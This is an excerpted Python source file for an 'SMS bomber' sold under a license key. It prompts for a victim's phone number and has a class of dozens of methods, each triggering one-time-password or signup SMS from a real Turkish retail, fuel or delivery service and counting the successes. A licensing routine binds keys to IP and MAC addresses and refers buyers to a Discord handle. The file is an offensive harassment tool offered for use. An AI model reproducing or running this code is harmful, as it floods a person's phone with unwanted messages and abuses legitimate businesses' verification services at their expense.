...
def uyg():
    ...
    text = """ ____ ____ ____ ____ ____ ____ ____ 
||k |||u |||t |||f |||o |||n |||k ||
||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|

kutfonk#5809                @kutfonk
    """
    ...
    adett = 50
    saniye = 0
    tel = input("Sms gönderilecek telefon numarasını (birleşik olarak) giriniz: ")
...
def check_license(ip, mac):
    ...
    cursor = conn.cursor()
    query = "SELECT device_key FROM sms WHERE ip = %s AND mac = %s"
...
def insert_sms_key(key):
    conn = connect_database()
    if conn is None:
        return

    # Öncelikle, anahtarın daha önce kullanılıp kullanılmadığını kontrol ediyoruz
    cursor = conn.cursor()
    query = "SELECT ip, mac FROM sms WHERE device_key = %s"
    cursor.execute(query, (key,))
    row = cursor.fetchone()

    # Anahtar daha önce kullanılmamış ise, yeni bir kayıt oluşturuyoruz
    if row is None:
        print("Bu anahtar geçersizdir. Uygulama başlatılamaz.")
        sleep(5)
        exit()
    else:
        # Anahtar daha önce kullanılmış ise, IP ve MAC adreslerini kontrol ediyoruz
        ip = get_ip_address()
        mac = get_mac_address()
        if row[0] == "none" or row[1] == "none":
            ip = get_ip_address()
            mac = get_mac_address()
            query = "UPDATE sms SET ip = %s, mac = %s WHERE device_key = %s"
            cursor.execute(query, (ip, mac, key))
            conn.commit()
            print("Key bu cihaza lisanslanmıştır uygulama başlatılıyor...")
            sleep(3)
            uyg()
        elif row[0] == ip and row[1] == mac:
            print("Key doğru ve uygulama başlatılıyor...")
            sleep(3)
            uyg()
        else:
            print("Bu anahtar başka bir bilgisayarda kullanılmıştır. Uygulama başlatılamaz. Lütfen yönetici ile iletişime geçin kutfonk#5809")
            sleep(7)
            exit()
...
def lisans():
    key = input("Lütfen Lisans kodunu giriniz (Lisan kodu için kutfonk#5809): ")
    insert_sms_key(key)
...
class SendSms():
    ...
    def Dsmartgo(self):
        ...
        try:
            ...
            print("[-] Başarısız! --> dsmartgo.com.tr")
        except AttributeError:
            print("[+] Başarılı! --> dsmartgo.com.tr")
            self.adet += 1
    ...
    def Kigili(self):    
        try:
            ...
            if kigili.status_code == 202:
                print("[+] Başarılı! --> kigili.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> kigili.com")
    ...
    def KahveDunyasi(self):    
        try:    
            ...
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print("[+] Başarılı! --> core.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:    
            print("[-] Başarısız! --> core.kahvedunyasi.com")
    ...
    def NaosStars(self):
        try:
            ...
            if naosstars.status_code == 202:
                print("[+] Başarılı! --> shop.naosstars.com")
                self.adet += 1 
            else:
                raise
        except:
            print("[-] Başarısız! --> shop.naosstars.com")
    ...
    def Wmf(self):
        try:
            ...
            if wmf.status_code == 202:
                print("[+] Başarılı! --> wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
            print("[-] Başarısız! --> wmf.com.tr")
    ...
    def IsteGelsin(self):
        try:
            ...
            if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
                print("[+] Başarılı! --> prod.fasapi.net")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> prod.fasapi.net")
    ...
    def Bim(self):
        try:
            ...
            if bim.status_code == 200:
                print("[+] Başarılı! --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> bim.veesk.net")
    ...
    def Sok(self):
        try:
            ...
            if len(r.json()["meta"]["messages"]["success"]) != 0:
                print("[+] Başarılı! --> api.ceptesok.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> api.ceptesok.com")
    ...
    def Tiklagelsin(self):
        try:
            ...
            if tiklagelsin.json()["data"]["generateOtp"] == True:
                print("[+] Başarılı! --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> svc.apps.tiklagelsin.com")
    ...
    def A101(self):
        try:
            ...
            if (r.status_code) == 200:
                print("[+] Başarılı! --> a101.com.tr")
                self.adet += 1
            else:
                raise 
        except:
            print("[-] Başarısız! --> a101.com.tr")
    ...
    def Englishhome(self):
        try:
            ...
            if home.status_code == 202:
                print("[+] Başarılı! --> englishhome.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> englishhome.com")
    ...
    def Sakasu(self):
        try:
            ...
            if su.json()["status"] == "ok":
                print("[+] Başarılı! --> sakasu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> sakasu.com.tr")
    ...
    def Rentiva(self): 
        try:
            ...
            if rentiva.json()["success"] == True:
                print("[+] Başarılı! --> rentiva.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> rentiva.com")
    ...
    def Bineq(self):
        try:
            ...
            if bineq.json()["IsSuccess"] == True:
                print("[+] Başarılı! --> bineqapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> bineqapi.heymobility.tech")
    ...
    def Link(self):
        try:
            ...
            if link.json()["detail"] == "Ok":
                print("[+] Başarılı! --> consumer-auth.linkfleet.de")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> consumer-auth.linkfleet.de")
    ...
    def Lonca(self):
        try:
            ...
            if lonca.status_code == 200:
                print("[+] Başarılı! --> loncamarket.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> loncamarket.com")   
    ...
    def Dgn(self):
        try:
            ...
            if dgn.status_code == 200:
                print("[+] Başarılı! --> odeme.dgnonline.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> odeme.dgnonline.com")  
    ...
    def Yaani(self):
        try:
            ...
            if r.status_code == 204:
                print("[+] Başarılı! --> api.yaanimail.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> api.yaanimail.com")  
    ...
    def Defacto(self):
        try:
            ...
            if r.json()["Data"]["IsSMSSend"] == True:
                print("[+] Başarılı! --> defacto.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> defacto.com.tr")
    ...
    def Mopas(self):
        try:
            ...
            if r.status_code == 200:
                print("[+] Başarılı! --> mopas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> mopas.com.tr")
    ...
    def Icq(self):
        try:
            ...
            if r.json()["status"]["code"] == 20000:
                print("[+] Başarılı! --> u.icq.net")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> u.icq.net")
    ...
    def Boyner(self):
        try:
            ...
            if r.json()["Success"] == True:
                print("[+] Başarılı! --> boyner.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> boyner.com")
    ...
    def Watsons(self):
        try:
            ...
            if r.status_code == 201:
                print("[+] Başarılı! --> watsons.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> watsons.com.tr")
    ...
    def Buyur(self):
        try:
            ...
            r = requests.post(url, headers=headers, data=data)
            if (r.status_code) == 200:
                print("[+] Başarılı! --> app.buyursungelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> app.buyursungelsin.com")
    ...
    def Osmanlideal(self):
        try:
            ...
            if r.status_code == 200:
                print("[+] Başarılı! --> osmgck.idealdata.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> osmgck.idealdata.com.tr")
    ...
    def Pinar(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.text == "true":
                print("[+] Başarılı! --> pinarsumobileservice.yasar.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> pinarsumobileservice.yasar.com.tr")
    ...
    def Suiste(self):
        try:
            ...
            if r.json()["code"] == "common.success":
                print("[+] Başarılı! --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> suiste.com")
    ...
    def Hayat(self):
        try:
            ...
            if (r.json()["IsSuccessful"]) == True:
                print("[+] Başarılı! --> hayatsu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> hayatsu.com.tr")
    ...
    def Pisir(self):
        try:
            ...
            if r.json()["ok"] == "1":
                print("[+] Başarılı! --> api.pisir.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> api.pisir.com")
    ...
    def KimGb(self):
        try:
            ...
            if r.status_code == 200:
                print("[+] Başarılı! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
    ...
    def IkinciYeni(self):
        try:
            ...
            if (r.json()["isSucceed"]) == True:
                print("[+] Başarılı! --> apigw.ikinciyeni.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> apigw.ikinciyeni.com")
    ...
    def Terra(self):
        try:
            ...
            r = requests.post(url,  json=json)
            if (r.status_code) == 201:
                print("[+] Başarılı! --> api.terrapizza.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> api.terrapizza.com.tr")
    ...
    def IpraGaz(self):
        try:
            ...
            if (r.json()["phoneNumber"]) == str(self.phone):
                print("[+] Başarılı! --> ipapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> ipapp.ipragaz.com.tr")
    ...
    def Mogaz(self):
        try:
            ...
            if (r.json()["messageCode"]) == "OK":
                print("[+] Başarılı! --> mogazmobilapinew.aygaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> mogazmobilapinew.aygaz.com.tr")
    ...
    def GoMobile(self):
        try:
            ...
            if (r.json()["data"]["success"]) == True:
                print("[+] Başarılı! --> gomobilapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> gomobilapp.ipragaz.com.tr")
    ...
    def PetrolOfisi(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print("[+] Başarılı! --> mobilapi.petrolofisi.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> mobilapi.petrolofisi.com.tr")
    ...
    def Total(self):
        try:
            ...
            if (r.json()["success"]) == True:
                print("[+] Başarılı! --> mobileapi.totalistasyonlari.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> mobileapi.totalistasyonlari.com.tr")
    ...
    def Opet(self):
        try:
            ...
            r = requests.post(url, json=json)
            if (r.status_code) == 200:
                print("[+] Başarılı! --> api.opet.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> api.opet.com.tr")
    ...
    def Dolap(self):
        try:
            ...
            if r.status_code == 200:
                print("[+] Başarılı! --> api-gateway.dolap.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> api-gateway.dolap.com")
    ...
    def Hey(self):
        try:
            ...
            if (r.json()["IsSuccess"]) == True:
                print("[+] Başarılı! --> heyapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> heyapi.heymobility.tech")
    ...
    def Tazi(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["kod"]) == "0000":
                print("[+] Başarılı! --> mobileapiv2.tazi.tech")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> mobileapiv2.tazi.tech")
    ...
    def Isbike(self):
        try:
            ...
            if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
                print("[+] Başarılı! --> app.isbike.istanbul")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> app.isbike.istanbul")
    ...
    def N11(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["isSuccess"]) == True:
                print("[+] Başarılı! --> mobileapi.n11.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> mobileapi.n11.com")
    ...
    def Joker(self):
        try:
            ...
            r = requests.post(url, headers=headers, data=data)
            if (r.json()["success"]) == True:
                print("[+] Başarılı! --> joker.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> joker.com.tr")
    ...
    def Ebebek(self):
        try:
            ...
            if r.json()["status"] == "SUCCESS":
                print("[+] Başarılı! --> api2.e-bebek.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> api2.e-bebek.com")
    ...
    def Saka(self):
        try:
            ...
            r = requests.post(url, json=json)
            if (r.json()["status"]) == 1 :
                print("[+] Başarılı! --> mobilcrm2.saka.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> mobilcrm2.saka.com.tr")
    ...
    def Gofody(self):
        try:
            ...
            r = requests.post(url, json=json)
            if (r.json()["success"]) == True:
                print("[+] Başarılı! --> backend.gofody.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> backend.gofody.com")
    ...
    def Madame(self):
        try:
            ...
            if (r.status_code) == 202:
                print("[+] Başarılı! --> madamecoco.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> madamecoco.com")
    ...
    def Buludag(self):
        try:
            ...
            if r.status_code == 200:
                print("[+] Başarılı! --> bilet.balikesiruludag.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> bilet.balikesiruludag.com.tr")   
    ...
    def Evidea(self):
        try:
            ...
            r = requests.post(url, headers=headers, data=data)      
            if r.status_code == 202:
                print("[+] Başarılı! --> evidea.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> evidea.com")
    ...
    def Koctas(self):
        try:
            ...
            if (r.json()["status"]) == True:
                print("[+] Başarılı! --> occ2.koctas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> occ2.koctas.com.tr")
    ...
    def Gratis(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if (r.status_code) == 200:
                print("[+] Başarılı! --> ivt.mobildev.com")
                self.adet += 1
            else:
                raise
        except:
            print("[-] Başarısız! --> ivt.mobildev.com")
